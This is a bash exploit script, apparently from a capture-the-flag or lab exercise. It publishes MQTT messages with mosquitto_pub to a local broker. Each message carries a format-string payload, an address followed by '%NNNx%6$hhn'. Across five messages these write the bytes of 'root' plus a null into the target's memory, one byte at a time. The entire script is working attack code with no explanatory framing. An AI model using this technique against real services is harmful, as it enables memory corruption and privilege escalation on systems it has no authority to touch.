#!/bin/bash

command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"

msb=$(echo -n $1 | tail -6c)

write_r="%110x%6\$hhn"
write_o="%107x%6\$hhn"
write_t="%112x%6\$hhn"
write_null="%252x%6\$hhn"

for i in {0..4}
do
    lsb=$(echo $1 | head -2c)
    lsb_decimal=$(printf "%d" $((16#$lsb+$i)))
    lsb_hex=$(printf "%.2x" $lsb_decimal)
    address=$(echo $lsb_hex$msb | xxd -p -r)
    if [ $i -eq 0 ]; then
        inject=$write_r
    elif [ $i -eq 1 ] || [ $i -eq 2 ]; then
        inject=$write_o
    elif [ $i -eq 3 ]; then
        inject=$write_t
    else
        inject=$write_null
    fi
    payload=$address$inject
    $command_prefix "$payload"
done